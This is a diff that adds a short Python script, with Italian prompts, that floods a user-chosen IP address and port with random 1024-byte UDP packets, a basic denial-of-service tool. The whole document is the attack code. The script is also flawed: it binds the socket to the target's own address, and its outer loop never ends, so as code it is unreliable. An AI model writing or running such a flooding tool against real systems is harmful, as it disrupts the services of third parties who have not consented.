@@ -1,0 +1,17 @@
+import socket
+import random
+
+target = input ("Inserisci l'indirizzo IP target: \n")
+port = int  (input ("inserisci la porta target: \n"))
+
+p =  int  (input("insersci quanti pacchetti UDP inviare: \n"))
+i = 0
+while 1:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.bind((target, port))
+        data = random.randbytes(1024)
+        addr= (str(target), int(port))
+        while i<p: #con questo ciclo quando i sara uguale a p uscira dal ciclo e finira di inviare pacchetti
+                s.sendto(data,addr)
+                i+=1
+        s.close()
